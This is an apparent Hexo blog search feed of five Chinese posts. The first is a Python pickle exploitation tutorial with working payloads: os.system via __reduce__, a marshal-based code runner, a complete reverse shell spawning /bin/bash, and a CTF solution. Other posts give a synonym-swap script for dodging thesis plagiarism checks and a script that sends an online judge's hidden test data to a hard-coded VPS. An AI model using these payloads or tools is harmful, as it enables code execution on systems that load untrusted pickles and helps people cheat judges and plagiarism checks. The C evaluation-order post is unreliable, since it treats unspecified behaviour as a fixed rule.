<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python  pickle 入门</title>
      <link href="/2019/12/16/pickle/"/>
      <url>/2019/12/16/pickle/</url>
      
        <content type="html"><![CDATA[<h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p>z牛: <a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p><pre><code class="python">MARK           = b&#39;(&#39;   # push special markobject on stackSTOP           = b&#39;.&#39;   # every pickle ends with STOPPOP            = b&#39;0&#39;   # discard topmost stack itemPOP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobjectDUP            = b&#39;2&#39;   # duplicate top stack itemFLOAT          = b&#39;F&#39;   # push float object; decimal string argumentINT            = b&#39;I&#39;   # push integer or bool; decimal string argumentBININT         = b&#39;J&#39;   # push four-byte signed intBININT1        = b&#39;K&#39;   # push 1-byte unsigned intLONG           = b&#39;L&#39;   # push long; decimal string argumentBININT2        = b&#39;M&#39;   # push 2-byte unsigned intNONE           = b&#39;N&#39;   # push NonePERSID         = b&#39;P&#39;   # push persistent object; id is taken from string argBINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stackSTRING         = b&#39;S&#39;   # push string; NL-terminated string argumentBINSTRING      = b&#39;T&#39;   # push string; counted binary string argumentSHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argumentBINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         = b&#39;a&#39;   # append stack top to list below itBUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string argsDICT           = b&#39;d&#39;   # build a dict from stack itemsEMPTY_DICT     = b&#39;}&#39;   # push empty dictAPPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack sliceGET            = b&#39;g&#39;   # push item from memo on stack; index is string argBINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           = b&#39;i&#39;   # build &amp; push class instanceLONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte argLIST           = b&#39;l&#39;   # build list from topmost stack itemsEMPTY_LIST     = b&#39;]&#39;   # push empty listOBJ            = b&#39;o&#39;   # build &amp; push class instancePUT            = b&#39;p&#39;   # store stack top in memo; index is string argBINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        = b&#39;s&#39;   # add key+value pair to dictTUPLE          = b&#39;t&#39;   # build tuple from topmost stack itemsEMPTY_TUPLE    = b&#39;)&#39;   # push empty tupleSETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairsBINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encodingTRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre><h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p><ol><li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li><li>写入对象类名</li><li>写入第一步生成的键值对</li></ol><h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol><li>获取pickle流</li><li>重新构建属性列表</li><li>根据保存的类名来创建对象</li><li>将属性列表恢复到对象中</li></ol><h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol><li>指令解释器<br>最后一步一定是返回栈顶元素</li><li>栈 </li><li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li></ol><h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol><li><p>pvm的操作码只有一个字节</p></li><li><p>需要参数的操作码,要在每一个参数后面加上换行符</p></li><li><p>从pickle流中读取数据,并加载到栈上</p></li></ol><h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table><thead><tr><th>操作码</th><th>助记</th><th>加载到栈上的数据类型</th><th>示例</th></tr></thead><tbody><tr><td>S</td><td>string</td><td>String</td><td>S’foo’\n</td></tr><tr><td>V</td><td>unicode</td><td>unicode</td><td>Vfo\u006f\n</td></tr><tr><td>I</td><td>int</td><td>int</td><td>I42\n</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>(</td><td>MARK</td><td>向栈中加入一个标记</td><td>(</td></tr><tr><td>0</td><td>POP</td><td>弹出栈顶元素并丢弃</td><td>0</td></tr><tr><td>p<code>&lt;memo_index&gt;</code>\n</td><td>PUT</td><td>复制栈顶元素到memo中</td><td>p101\n</td></tr><tr><td>g<code>&lt;memo_index&gt;</code>\n</td><td>GET</td><td>将memo中指定元素拷贝到栈顶</td><td>g101\n</td></tr></tbody></table><h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>l</td><td>列表</td><td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td><td>(S’string’\nl</td></tr><tr><td>t</td><td>元组</td><td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td><td>(S’string’\nS’string2’\nt</td></tr><tr><td>d</td><td>字典</td><td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td><td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td></tr><tr><td>s</td><td>SETITEM</td><td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td><td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul><li><p>生成元组的指令</p><pre><code>(S&#39;str1&#39;S&#39;str2&#39;I1234t</code></pre></li><li><p>生成元组的过程图</p></li></ul><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image.png"></p><h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>c</td><td>GLOBAL</td><td>需要两个参数(module,class)来创建对象,并将其放到栈中</td><td>cos\nsystem\n</td></tr><tr><td>R</td><td>REDUCE</td><td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td><td>cos\nsystem\n(S’sleep 10’\ntR</td></tr></tbody></table><h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image2.png"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image3.png"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image4.png"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5.png"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6.png"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image7.png"></p><h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p><pre><code class="python">f=open(&#39;/path/to/massive/sikrit&#39;) f.read()</code></pre><p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p><p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p><p>最后合成的pickle是</p><pre><code>#step1c__builtin__open(S&#39;/path/to/massive/sikrit&#39;tRp100#step2c__builtin__apply(c__builtin__getattr(c__builtin__fileS&#39;read&#39;tR(g100ltR.</code></pre><h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image8.png"></p><h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p><blockquote><p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p></blockquote><pre><code class="python">import os, pickleclass Test(object):    def __reduce__(self):        return (os.system,(&#39;ls&#39;,))print(pickle.dumps(Test(), protocol=0))</code></pre><h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><pre><code class="python"># !/usr/bin/env python# -*- coding:utf-8 -*-__author__ = &#39;bit4&#39;__github__ = &#39;https://github.com/bit4woo&#39;import marshalimport base64import cPickleimport urllibimport pickledef foo():#you should write your code in this function    import os    def fib(n):        if n &lt;= 1:            return n        return fib(n-1) + fib(n-2)    print &#39;fib(10) =&#39;, fib(10)    os.system(&#39;dir&#39;)code_serialized = base64.b64encode(marshal.dumps(foo.func_code))#为了保证code_serialized中的内容得到执行，我们需要如下代码#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#39;&#39;))()payload =  &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))print(payload)</code></pre><h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a href="https://github.com/sensepost/anapickle" target="_blank" rel="noopener">converttopickle.py</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code class="python">&#39;&#39;&#39;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#39;__getitem__&#39;\ntRp102\n0g102\n(S&#39;AF_INET&#39;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#39;__getitem__&#39;\ntRp105\n0g105\n(S&#39;SOCK_STREAM&#39;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#39;__getitem__&#39;\ntRp108\n0g108\n(S&#39;IPPROTO_TCP&#39;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#39;__getitem__&#39;\ntRp111\n0g111\n(S&#39;SOL_SOCKET&#39;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#39;__getitem__&#39;\ntRp114\n0g114\n(S&#39;SO_REUSEADDR&#39;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;setsockopt&#39;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;connect&#39;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#39;localhost&#39;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#39;fileno&#39;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#39;/bin/bash&#39;\ntI0\nS&#39;/bin/bash&#39;\ng122\ng122\ng122\ntRp123\n0S&#39;finished&#39;\n.&#39;&#39;&#39;</code></pre><p>localhost:55555</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>使用v0版的pickle协议,保证shellcode的通用性</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">题目链接</a></p><p>考点:pickle</p><p>代码审计一波后</p><p>如果猜对10次后会给flag(机会只有10次)</p><p>因为知道是考pickle直接全局搜索pickle发现在server处有</p><p><code>ticket = restricted_loads(ticket)</code></p><p>其中ticket是我们可控点</p><p>跟进去看</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:            return getattr(sys.modules[module], name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p><p>在这一题中拿到flag有两种方式:</p><ol><li>命令执行</li><li>通过游戏</li></ol><p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p><p>而游戏中判定赢的条件是</p><pre><code class="python">class Game    def is_win(self):        return self.win_count == max_round</code></pre><p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p><p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p><p>那么接下来就是如何修改了</p><p>在pickle的操作码中我们发现</p><p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p><p>其中update()就可以修改game的属性了</p><p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p><p>一路跟踪发现b操作码的实现</p><pre><code class="python">    def load_build(self):        stack = self.stack        state = stack.pop()        inst = stack[-1]        setstate = getattr(inst, &quot;__setstate__&quot;, None)        if setstate is not None:            setstate(state)            return        slotstate = None        if isinstance(state, tuple) and len(state) == 2:            state, slotstate = state        if state:            inst_dict = inst.__dict__            intern = sys.intern            for k, v in state.items():                if type(k) is str:                    inst_dict[intern(k)] = v                else:                    inst_dict[k] = v        if slotstate:            for k, v in slotstate.items():                setattr(inst, k, v)</code></pre><p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p><p>最后的payload:</p><pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/16/pickle/">https://explorersss.github.io/2019/12/16/pickle/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勉强能用的论文降重</title>
      <link href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/"/>
      <url>/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="勉强能用的论文降重"><a href="#勉强能用的论文降重" class="headerlink" title="勉强能用的论文降重"></a>勉强能用的论文降重</h1><pre><code class="python">import sysif len(sys.argv) !=2:    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])    exit()import synonymsf=sys.argv[1]s=&quot;&quot;with open(f,&quot;r&quot;) as fl:    s=fl.read()resstr,stype=synonyms.seg(s)with open(sys.argv[2],&quot;w&quot;) as fw:    for i in resstr:        if len(i)==1:            fw.write(i)        else :            nearbystr,num=synonyms.nearby(i)            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:                print(nearbystr[1],num[1])                fw.write(nearbystr[1])            else :                fw.write(i)</code></pre><p>可以调整<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>来修改近义词的准确率.</p><p>用完之后一定要自己校对一遍!!!不然…..</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/15/勉强能用的论文降重/">https://explorersss.github.io/2019/12/15/勉强能用的论文降重/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在线oj获取数据</title>
      <link href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p><pre><code class="python">import socketimport sys    ip = &#39;39.108.164.219&#39;port = 60000def send_raw(raw):    try:        with socket.create_connection((ip, port), timeout=10) as conn:            conn.send(bytes(raw,encoding=&quot;ascii&quot;))            conn.close()    except:        return False      return Truedata=&quot;&quot;for line in sys.stdin:    data+=linesend_raw(data)</code></pre><p>vps上运行</p><pre><code class="shell">#!/bin/bashi=1while [ $i -eq 1 ]do      nc -FNlp 60000  &gt;&gt; /tmp/data    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/datadone</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/15/在线oj获取数据/">https://explorersss.github.io/2019/12/15/在线oj获取数据/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由cout和printf来对函数传参过程的探讨</title>
      <link href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/"/>
      <url>/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="由cout和printf来对函数传参过程的探讨"><a href="#由cout和printf来对函数传参过程的探讨" class="headerlink" title="由cout和printf来对函数传参过程的探讨"></a>由cout和printf来对函数传参过程的探讨</h1><h2 id="令人疑惑的结果"><a href="#令人疑惑的结果" class="headerlink" title="令人疑惑的结果"></a>令人疑惑的结果</h2><p>来看一个代码吧</p><pre><code class="c++">#include&lt;stdio.h&gt;int i=0;int update(){i++;return i;}int main(){    printf(&quot;update():%d i:%d\n&quot;,update(),i);    return 0;}</code></pre><p>你觉得它的输出结果是什么<br><del>update():1 i:1</del> ?<br><strong>错</strong>，正确输出是<code>update():1 i:0</code></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为何会如此,先来做个实验康康吧:</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    printf(&quot;----------------------------test printf----------------------------\n&quot;);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;update():%d i:%d\n&quot;,update(),i);    printf(&quot;later:%d\n&quot;,i);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;i:%d update():%d \n&quot;,i,update());    printf(&quot;later:%d\n&quot;,i);    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());}</code></pre><p>它的输出结果是</p><pre><code>----------------------------test printf----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><p>只有printf是这样的?不，可变参数的打印函数都具有这样的特性<br>我们来测试一下cout来验证一下</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;    i=0;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;}</code></pre><p>它的输出结果是:</p><pre><code>---------------------------- test cout ----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><h2 id="汇编层面的解释"><a href="#汇编层面的解释" class="headerlink" title="汇编层面的解释"></a>汇编层面的解释</h2><p>为什么会这样,这就必须说起c和c++中关于函数传参的过程了:</p><p>在汇编中函数传参要从最后一个参数到第一个参数分别入栈，这样函数取参数的时候，pop出来的顺序才是1-n。</p><p>因此,在<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>中,函数先压入i,再执行update(),将其返回值压入栈。</p><p>以上只是理论，真实的环境中由x86,x64,32位,16位机,它们的具体的传参方式略有不同:)  </p><p>我们来看一下x64下这一条语句的汇编代码</p><pre><code>mov     ebx, cs:icall    _Z6updatev      ; update(void)mov     r8d, ebxmov     edx, eaxlea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈。</p><p>上述代码中 格式化字符串在rcx中(最后一个赋值),update()返回值在edx,中第二个赋值。i在r8中第一个赋值 。</p><p>但是我们可以看到<code>mov     ebx, cs:i</code>程序先将i的值移动到ebx中，再调用update函数,将返回值所在寄存器eax移动到edx中。</p><p>虽然过程有点变化,但是最后的结果还是和在汇编中函数传参要从最后一个参数到第一个参数分别入栈。</p><h2 id="来练习一下吧"><a href="#来练习一下吧" class="headerlink" title="来练习一下吧"></a>来练习一下吧</h2><p>最后上一个题目吧//</p><pre><code class="c++">#include &lt;stdio.h&gt;int main(){    long long a = 1, b = 2, c = 3;    printf(&quot;%d %d %d\n&quot;, a,b,c);    return 0;}</code></pre><p>求输出</p><p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">答案和解析</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/14/由cout和printf来对函数传参过程的探讨/">https://explorersss.github.io/2019/12/14/由cout和printf来对函数传参过程的探讨/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/2019/12/14/hello-world/"/>
      <url>/2019/12/14/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/14/hello-world/">https://explorersss.github.io/2019/12/14/hello-world/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
